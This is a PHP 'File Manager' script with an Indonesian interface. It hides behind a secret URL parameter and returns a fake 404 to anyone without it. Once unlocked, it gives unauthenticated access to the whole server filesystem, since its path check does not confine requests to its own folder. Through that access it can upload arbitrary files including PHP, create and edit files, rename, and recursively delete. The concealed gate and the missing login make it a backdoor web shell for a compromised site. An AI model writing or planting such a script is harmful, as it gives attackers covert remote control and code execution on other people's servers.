<?php
// ─── GATE ───────────────────────────────────────────────
if (!isset($_GET['autis'])) {
    http_response_code(404);
    exit;
}
// ────────────────────────────────────────────────────────

session_start();

$msg = '';
$err = '';

$BASE = realpath(__DIR__);
$SELF = $_SERVER['PHP_SELF'] . '?autis';  // base URL dengan gate

function safePath($path, $base) {
    $real = realpath($path);
    if ($real === false) return $base;
    return $real;
}

$cur = isset($_GET['d']) ? $_GET['d'] : $BASE;
$cur = safePath($cur, $BASE);
if (!is_dir($cur)) $cur = $BASE;

$parent    = dirname($cur);
if (!is_dir($parent)) $parent = $cur;
$hasParent = ($parent !== $cur);

function rrmdir($dir) {
    if (!is_dir($dir)) return false;
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($p) ? rrmdir($p) : @unlink($p);
    }
    return @rmdir($dir);
}

function fmtSize($b) {
    if ($b >= 1073741824) return round($b/1073741824, 1).' GB';
    if ($b >= 1048576)    return round($b/1048576, 1).' MB';
    if ($b >= 1024)       return round($b/1024, 1).' KB';
    return $b.' B';
}

function fIcon($name) {
    $e = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $m = [
        'pdf'=>'📕','php'=>'🐘','js'=>'📜','html'=>'🌐','htm'=>'🌐',
        'css'=>'🎨','json'=>'📋','xml'=>'📄','sql'=>'🗃️',
        'jpg'=>'🖼️','jpeg'=>'🖼️','png'=>'🖼️','gif'=>'🖼️','webp'=>'🖼️',
        'svg'=>'🖼️','ico'=>'🖼️',
        'zip'=>'🗜️','rar'=>'🗜️','gz'=>'🗜️','tar'=>'🗜️',
        'txt'=>'📝','md'=>'📝','csv'=>'📊','log'=>'📋',
        'mp4'=>'🎬','mkv'=>'🎬','mp3'=>'🎵','wav'=>'🎵',
        'docx'=>'📘','xlsx'=>'📗','pptx'=>'📙',
        'sh'=>'⚙️','py'=>'🐍','rb'=>'💎','go'=>'🔵',
    ];
    return $m[$e] ?? '📄';
}

function relPath($abs, $base) {
    $rel = substr($abs, strlen($base));
    return $rel === '' ? '/' : str_replace('\\', '/', $rel);
}

function buildBreadcrumb($cur, $self) {
    $parts = explode('/', str_replace('\\', '/', $cur));
    $html  = '';
    $built = '';
    foreach ($parts as $i => $p) {
        if ($p === '') {
            $built = '/';
            if ($i === 0) { $html .= '<span class="bc-sep">/</span>'; continue; }
        } else {
            $built = rtrim($built, '/') . '/' . $p;
        }
        $isLast = ($built === str_replace('\\', '/', $cur));
        if ($isLast) {
            $html .= '<span class="bc-cur">' . htmlspecialchars($p) . '</span>';
        } else {
            $html .= '<a class="bc-link" href="' . htmlspecialchars($self) . '&d=' . urlencode($built) . '">' . htmlspecialchars($p) . '</a>';
            $html .= '<span class="bc-sep">/</span>';
        }
    }
    return $html;
}

$act = $_POST['act'] ?? '';

if ($act === 'up' && isset($_FILES['f'])) {
    $ok = 0;
    foreach ($_FILES['f']['name'] as $i => $n) {
        if ($_FILES['f']['error'][$i] !== 0) continue;
        $dst = $cur . DIRECTORY_SEPARATOR . basename($n);
        if (move_uploaded_file($_FILES['f']['tmp_name'][$i], $dst)) $ok++;
    }
    $_SESSION['msg'] = $ok . ' file berhasil diupload.';
    header('Location: ' . $SELF . '&d=' . urlencode($cur));
    exit;
}

if ($act === 'md') {
    $n = preg_replace('/[^a-zA-Z0-9._\- ]/', '', trim($_POST['n'] ?? ''));
    $target = $cur . DIRECTORY_SEPARATOR . $n;
    if ($n === '') {
        $err = 'Nama folder kosong.';
    } elseif (file_exists($target)) {
        $err = 'Sudah ada folder dengan nama itu.';
    } elseif (mkdir($target, 0755, true)) {
        $_SESSION['msg'] = "Folder \"$n\" berhasil dibuat.";
        header('Location: ' . $SELF . '&d=' . urlencode($cur));
        exit;
    } else {
        $err = 'Gagal membuat folder (cek permission).';
    }
}

if ($act === 'nf') {
    $n = preg_replace('/[^a-zA-Z0-9._\-]/', '', trim($_POST['n'] ?? ''));
    $c = $_POST['c'] ?? '';
    $target = $cur . DIRECTORY_SEPARATOR . $n;
    if ($n === '') {
        $err = 'Nama file kosong.';
    } elseif (file_exists($target)) {
        $err = 'File sudah ada.';
    } elseif (file_put_contents($target, $c) !== false) {
        $_SESSION['msg'] = "File \"$n\" berhasil dibuat.";
        header('Location: ' . $SELF . '&d=' . urlencode($cur));
        exit;
    } else {
        $err = 'Gagal membuat file (cek permission).';
    }
}

if ($act === 'savefile') {
    $target  = $_POST['target'] ?? '';
    $content = $_POST['content'] ?? '';
    $target  = safePath($target, $BASE);
    $retDir  = safePath(dirname($target), $BASE);
    if (!is_file($target)) {
        $err = 'File tidak ditemukan.';
    } elseif (!is_writable($target)) {
        $err = 'File tidak bisa ditulis (cek permission).';
    } elseif (file_put_contents($target, $content) !== false) {
        $_SESSION['msg'] = 'File berhasil disimpan.';
        header('Location: ' . $SELF . '&d=' . urlencode($retDir));
        exit;
    } else {
        $err = 'Gagal menyimpan file.';
    }
}

if ($act === 'rename') {
    $target  = safePath($_POST['target'] ?? '', $BASE);
    $newname = preg_replace('/[^a-zA-Z0-9._\- ]/', '', trim($_POST['newname'] ?? ''));
    $dir = dirname($target);
    $dst = $dir . DIRECTORY_SEPARATOR . $newname;
    if ($newname === '') {
        $err = 'Nama baru tidak boleh kosong.';
    } elseif (file_exists($dst)) {
        $err = 'Sudah ada file/folder dengan nama itu.';
    } elseif (rename($target, $dst)) {
        $_SESSION['msg'] = 'Berhasil direname.';
        header('Location: ' . $SELF . '&d=' . urlencode($cur));
        exit;
    } else {
        $err = 'Gagal rename.';
    }
}

if ($act === 'del') {
    $target = safePath($_POST['target'] ?? '', $BASE);
    if (!file_exists($target)) {
        $err = 'Target tidak ditemukan.';
    } else {
        $ok = is_dir($target) ? rrmdir($target) : @unlink($target);
        if ($ok) {
            $_SESSION['msg'] = 'Berhasil dihapus.';
            header('Location: ' . $SELF . '&d=' . urlencode($cur));
            exit;
        } else {
            $err = 'Gagal menghapus.';
        }
    }
}

if (isset($_SESSION['msg'])) { $msg = $_SESSION['msg']; unset($_SESSION['msg']); }

$editFile    = isset($_GET['edit']) ? safePath($_GET['edit'], $BASE) : '';
$editMode    = false;
$editContent = '';

if ($editFile !== '' && is_file($editFile) && is_readable($editFile)) {
    $editMode    = true;
    $editContent = file_get_contents($editFile);
    if ($editContent === false) $editContent = '';
} elseif ($editFile !== '') {
    $err = 'File edit tidak ditemukan / tidak bisa dibaca.';
}

$dirs = $files = [];
if (is_dir($cur) && is_readable($cur)) {
    foreach (scandir($cur) as $it) {
        if ($it === '.' || $it === '..') continue;
        $abs = $cur . DIRECTORY_SEPARATOR . $it;
        is_dir($abs) ? ($dirs[] = $it) : ($files[] = $it);
    }
    sort($dirs); sort($files);
}
$totalItems = count($dirs) + count($files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d0f14;--bg2:#13161e;--bg3:#1a1e28;--border:#252935;
  --green:#00e5a0;--text:#e2e6f0;--muted:#6b7280;
  --red:#ff4f5e;--yellow:#fbbf24;--blue:#60a5fa;
  --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
}
html,body{height:100%}
body{font-family:var(--sans);background:var(--bg);color:var(--text);display:flex;flex-direction:column;min-height:100vh}
a{text-decoration:none}

header{display:flex;align-items:center;gap:12px;padding:13px 22px;background:var(--bg2);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:50;flex-wrap:wrap}
.logo{font-weight:800;font-size:1.05rem;color:var(--green);letter-spacing:-.5px;white-space:nowrap}
.pathbar{font-family:var(--mono);font-size:.74rem;color:var(--muted);flex:1;word-break:break-all}
.pathbar span{color:var(--green);font-weight:700}

.wrap{display:flex;flex:1;overflow:hidden}

aside{width:255px;flex-shrink:0;background:var(--bg2);border-right:1px solid var(--border);overflow-y:auto;padding:14px 0}
.sec{padding:0 11px 14px;border-bottom:1px solid var(--border);margin-bottom:3px}
.sec:last-child{border-bottom:none}
.sec-label{font-size:.63rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);padding:3px 3px 9px}
.form-col{display:flex;flex-direction:column;gap:8px}
.lbl{font-size:.7rem;color:var(--muted);font-weight:600;display:block;margin-bottom:3px}
input[type=text],textarea{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:var(--mono);font-size:.78rem;padding:7px 9px;outline:none;transition:.15s}
input[type=text]:focus,textarea:focus{border-color:var(--green)}
textarea{resize:vertical;min-height:80px}
.btn{display:flex;align-items:center;justify-content:center;gap:5px;padding:8px 13px;border-radius:5px;border:none;font-family:var(--sans);font-weight:700;font-size:.76rem;cursor:pointer;width:100%;transition:.15s}
.btn-green{background:var(--green);color:#000}
.btn-green:hover{filter:brightness(1.1)}
.btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
.btn-outline:hover{border-color:var(--green);color:var(--green)}

.upzone{border:2px dashed var(--border);border-radius:8px;padding:18px 10px;text-align:center;cursor:pointer;position:relative;transition:.2s}
.upzone:hover,.upzone.drag{border-color:var(--green);background:rgba(0,229,160,.04)}
.upzone .ico{font-size:1.8rem;margin-bottom:6px}
.upzone strong{display:block;font-size:.82rem;margin-bottom:3px}
.upzone small{font-size:.7rem;color:var(--muted)}
.upzone input[type=file]{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:pointer}
#flist{font-size:.72rem;color:var(--muted);font-family:var(--mono)}
#flist div{padding:2px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

main{flex:1;padding:18px 22px;overflow-y:auto}

.alert{padding:10px 15px;border-radius:6px;margin-bottom:14px;font-size:.82rem;font-weight:600}
.alert-ok{background:rgba(0,229,160,.1);border:1px solid rgba(0,229,160,.3);color:var(--green)}
.alert-err{background:rgba(255,79,94,.1);border:1px solid rgba(255,79,94,.3);color:var(--red)}

.bar{display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap}
.bar-left{display:flex;align-items:center;gap:12px;flex:1;flex-wrap:wrap}
.back-link{font-size:.8rem;color:var(--green);display:flex;align-items:center;gap:4px;white-space:nowrap}
.back-link:hover{text-decoration:underline}
.count{font-size:.74rem;color:var(--muted)}
.bar input[type=text]{width:200px;padding:6px 10px;font-size:.78rem}

.tbl{width:100%;border-collapse:collapse;font-size:.82rem}
.tbl th{text-align:left;font-size:.68rem;letter-spacing:.8px;text-transform:uppercase;color:var(--muted);padding:7px 10px;border-bottom:1px solid var(--border);font-weight:700}
.tbl td{padding:7px 10px;border-bottom:1px solid rgba(37,41,53,.6);vertical-align:middle}
.tbl tr:hover td{background:rgba(255,255,255,.02)}
.fname a,.fname{color:var(--text);font-family:var(--mono);font-size:.8rem;display:flex;align-items:center;gap:5px}
.fname a:hover{color:var(--green)}
.fic{font-size:1rem;flex-shrink:0}
.meta{font-size:.72rem;color:var(--muted);font-family:var(--mono);white-space:nowrap}
.tag{font-size:.65rem;font-weight:700;padding:2px 7px;border-radius:3px;font-family:var(--mono);letter-spacing:.5px;text-transform:uppercase}
.tag-d{background:rgba(251,191,36,.1);color:var(--yellow);border:1px solid rgba(251,191,36,.2)}
.tag-f{background:rgba(96,165,250,.1);color:var(--blue);border:1px solid rgba(96,165,250,.2)}
.actions{display:flex;align-items:center;gap:4px;flex-wrap:nowrap}
.action-link{font-size:.72rem;color:var(--muted);padding:4px 8px;border-radius:4px;border:1px solid var(--border);white-space:nowrap;transition:.15s}
.action-link:hover{border-color:var(--green);color:var(--green)}
.action-link.blue{color:var(--blue);border-color:rgba(96,165,250,.3)}
.action-link.blue:hover{border-color:var(--blue)}
.action-link.red{color:var(--red);border-color:rgba(255,79,94,.3)}
.action-link.red:hover{border-color:var(--red)}
.action-btn{background:none;border:1px solid var(--border);color:var(--muted);font-size:.72rem;padding:4px 8px;border-radius:4px;cursor:pointer;font-family:var(--sans);transition:.15s;white-space:nowrap}
.action-btn.red{color:var(--red);border-color:rgba(255,79,94,.3)}
.action-btn.red:hover{background:rgba(255,79,94,.1)}

.empty{text-align:center;padding:60px 20px;color:var(--muted)}
.empty-ico{font-size:3rem;margin-bottom:10px}

.editor-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:18px}
.editor-head{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid var(--border)}
.editor-title{font-size:.82rem;font-family:var(--mono);color:var(--blue)}
.editor-body{padding:14px}
.editor-body textarea{min-height:320px;font-size:.8rem;tab-size:4}
.editor-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}

.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center}
.modal-overlay.open{display:flex}
.modal{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;width:360px;max-width:95vw}
.modal h3{font-size:.9rem;margin-bottom:12px}
.modal .btn-row{display:flex;gap:8px;margin-top:12px}
.modal .btn-row .btn{width:auto;flex:1}

.pathbar{display:flex;align-items:center;flex-wrap:wrap;gap:0;font-family:var(--mono);font-size:.78rem;flex:1;min-width:0}
.bc-link{color:var(--muted);transition:.15s;white-space:nowrap}
.bc-link:hover{color:var(--green)}
.bc-sep{color:var(--border);margin:0 2px}
.bc-cur{color:var(--green);font-weight:700;white-space:nowrap}
.bc-pin{margin-right:6px;font-size:.9rem;flex-shrink:0}

@media(max-width:700px){
  .wrap{flex-direction:column}
  aside{width:100%;border-right:none;border-bottom:1px solid var(--border)}
  main{padding:12px}
  .tbl th:nth-child(3),.tbl td:nth-child(3),.tbl th:nth-child(4),.tbl td:nth-child(4){display:none}
}
</style>
</head>
<body>

<header>
  <div class="logo">📂 FileMgr</div>
  <div class="pathbar"><span class="bc-pin">📍</span><?= buildBreadcrumb($cur, $SELF) ?></div>
</header>

<div class="wrap">
<aside>

  <div class="sec">
    <div class="sec-label">Upload File</div>
    <form method="post" enctype="multipart/form-data" action="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" class="form-col">
      <input type="hidden" name="act" value="up">
      <div class="upzone" id="dz">
        <div class="ico">📤</div>
        <strong>Drop file di sini</strong>
        <small>atau klik untuk pilih</small>
        <input type="file" name="f[]" multiple id="fi">
      </div>
      <div id="flist"></div>
      <button type="submit" class="btn btn-green">Upload</button>
    </form>
  </div>

  <div class="sec">
    <div class="sec-label">Buat Folder</div>
    <form method="post" action="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" class="form-col">
      <input type="hidden" name="act" value="md">
      <div>
        <label class="lbl">Nama Folder</label>
        <input type="text" name="n" placeholder="nama-folder" required>
      </div>
      <button type="submit" class="btn btn-outline">📁 Buat Folder</button>
    </form>
  </div>

  <div class="sec">
    <div class="sec-label">Buat File Baru</div>
    <form method="post" action="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" class="form-col">
      <input type="hidden" name="act" value="nf">
      <div>
        <label class="lbl">Nama File</label>
        <input type="text" name="n" placeholder="file.txt" required>
      </div>
      <div>
        <label class="lbl">Isi (opsional)</label>
        <textarea name="c" placeholder="Konten file..."></textarea>
      </div>
      <button type="submit" class="btn btn-outline">📄 Buat File</button>
    </form>
  </div>

</aside>

<main>
  <?php if ($msg): ?>
    <div class="alert alert-ok">✅ <?= htmlspecialchars($msg) ?></div>
  <?php endif; ?>
  <?php if ($err): ?>
    <div class="alert alert-err">⚠️ <?= htmlspecialchars($err) ?></div>
  <?php endif; ?>

  <?php if ($editMode): ?>
    <div class="editor-wrap">
      <div class="editor-head">
        <div class="editor-title">✏️ <?= htmlspecialchars(relPath($editFile, $BASE)) ?></div>
        <a href="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" class="back-link">⬅ Kembali</a>
      </div>
      <div class="editor-body">
        <form method="post" action="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>">
          <input type="hidden" name="act" value="savefile">
          <input type="hidden" name="target" value="<?= htmlspecialchars($editFile) ?>">
          <textarea name="content"><?= htmlspecialchars($editContent) ?></textarea>
          <div class="editor-actions">
            <button type="submit" class="btn btn-green" style="width:auto;padding:8px 20px">💾 Simpan</button>
            <a href="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" class="action-link">Batal</a>
          </div>
        </form>
      </div>
    </div>
  <?php endif; ?>

  <div class="bar">
    <div class="bar-left">
      <?php if ($hasParent): ?>
        <a href="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($parent) ?>" class="back-link">⬅ <?= htmlspecialchars(basename($parent) ?: '/') ?></a>
      <?php endif; ?>
      <span class="count"><?= $totalItems ?> item</span>
    </div>
    <input type="text" id="q" placeholder="🔍 Cari file..." oninput="cari(this.value)">
  </div>

  <?php if ($totalItems === 0): ?>
    <div class="empty">
      <div class="empty-ico">🗂️</div>
      <p>Folder kosong.</p>
    </div>
  <?php else: ?>
  <table class="tbl" id="tbl">
    <thead>
      <tr>
        <th style="width:38%">Nama</th>
        <th>Tipe</th>
        <th>Ukuran</th>
        <th>Diubah</th>
        <th style="width:220px">Aksi</th>
      </tr>
    </thead>
    <tbody>
    <?php foreach ($dirs as $d):
      $abs = $cur . DIRECTORY_SEPARATOR . $d;
    ?>
      <tr>
        <td class="fname isdir">
          <a href="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($abs) ?>">
            <span class="fic">📁</span><?= htmlspecialchars($d) ?>
          </a>
        </td>
        <td><span class="tag tag-d">dir</span></td>
        <td class="meta">—</td>
        <td class="meta"><?= date('Y-m-d H:i', (int)filemtime($abs)) ?></td>
        <td>
          <div class="actions">
            <a href="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($abs) ?>" class="action-link">📂 Buka</a>
            <button class="action-btn" onclick="openRename('<?= addslashes($abs) ?>','<?= addslashes($d) ?>')">✏️ Rename</button>
            <form method="post" action="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" style="display:inline" onsubmit="return confirm('Yakin hapus folder ini beserta isinya?')">
              <input type="hidden" name="act" value="del">
              <input type="hidden" name="target" value="<?= htmlspecialchars($abs) ?>">
              <button type="submit" class="action-btn red">🗑</button>
            </form>
          </div>
        </td>
      </tr>
    <?php endforeach; ?>

    <?php foreach ($files as $f):
      $abs = $cur . DIRECTORY_SEPARATOR . $f;
      $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION) ?: 'file');
      $relUrl = relPath($abs, $BASE);
    ?>
      <tr>
        <td class="fname">
          <span style="display:flex;align-items:center;gap:5px">
            <span class="fic"><?= fIcon($f) ?></span><?= htmlspecialchars($f) ?>
          </span>
        </td>
        <td><span class="tag tag-f"><?= htmlspecialchars($ext) ?></span></td>
        <td class="meta"><?= fmtSize((int)filesize($abs)) ?></td>
        <td class="meta"><?= date('Y-m-d H:i', (int)filemtime($abs)) ?></td>
        <td>
          <div class="actions">
            <a href="<?= htmlspecialchars($SELF) ?>&edit=<?= urlencode($abs) ?>&d=<?= urlencode($cur) ?>" class="action-link blue">✏️</a>
            <a href="<?= htmlspecialchars($relUrl) ?>" class="action-link" target="_blank">👁️</a>
            <button class="action-btn" onclick="openRename('<?= addslashes($abs) ?>','<?= addslashes($f) ?>')">🔤</button>
            <form method="post" action="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" style="display:inline" onsubmit="return confirm('Yakin hapus file ini?')">
              <input type="hidden" name="act" value="del">
              <input type="hidden" name="target" value="<?= htmlspecialchars($abs) ?>">
              <button type="submit" class="action-btn red">🗑</button>
            </form>
          </div>
        </td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table>
  <?php endif; ?>
</main>
</div>

<!-- Rename Modal -->
<div class="modal-overlay" id="renameModal">
  <div class="modal">
    <h3>✏️ Rename</h3>
    <form method="post" action="<?= htmlspecialchars($SELF) ?>&d=<?= urlencode($cur) ?>" id="renameForm">
      <input type="hidden" name="act" value="rename">
      <input type="hidden" name="target" id="renameTarget">
      <label class="lbl">Nama Baru</label>
      <input type="text" name="newname" id="renameInput" required autocomplete="off">
      <div class="btn-row">
        <button type="submit" class="btn btn-green">Simpan</button>
        <button type="button" class="btn btn-outline" onclick="closeRename()">Batal</button>
      </div>
    </form>
  </div>
</div>

<script>
var dz = document.getElementById('dz');
var fi = document.getElementById('fi');
var fl = document.getElementById('flist');

function showF(files) {
  fl.innerHTML = Array.from(files).map(function(f) {
    return '<div>📄 ' + f.name + '</div>';
  }).join('');
}

fi.addEventListener('change', function() { showF(fi.files); });
dz.addEventListener('dragover', function(e) { e.preventDefault(); dz.classList.add('drag'); });
dz.addEventListener('dragleave', function() { dz.classList.remove('drag'); });
dz.addEventListener('drop', function(e) {
  e.preventDefault();
  dz.classList.remove('drag');
  if (e.dataTransfer.files.length) {
    try {
      var dt = new DataTransfer();
      Array.from(e.dataTransfer.files).forEach(function(f) { dt.items.add(f); });
      fi.files = dt.files;
    } catch(x) {}
    showF(e.dataTransfer.files);
  }
});

function cari(q) {
  var rows = document.querySelectorAll('#tbl tbody tr');
  var lq = q.toLowerCase();
  rows.forEach(function(r) {
    var t = (r.querySelector('.fname') || {}).textContent || '';
    r.style.display = t.toLowerCase().indexOf(lq) >= 0 ? '' : 'none';
  });
}

function openRename(target, currentName) {
  document.getElementById('renameTarget').value = target;
  document.getElementById('renameInput').value = currentName;
  document.getElementById('renameModal').classList.add('open');
  setTimeout(function() { document.getElementById('renameInput').select(); }, 50);
}
function closeRename() {
  document.getElementById('renameModal').classList.remove('open');
}
document.getElementById('renameModal').addEventListener('click', function(e) {
  if (e.target === this) closeRename();
});

document.querySelectorAll('.alert').forEach(function(a) {
  setTimeout(function() {
    a.style.transition = 'opacity .4s';
    a.style.opacity = '0';
    setTimeout(function() { a.remove(); }, 400);
  }, 4000);
});
</script>
</body>
</html>
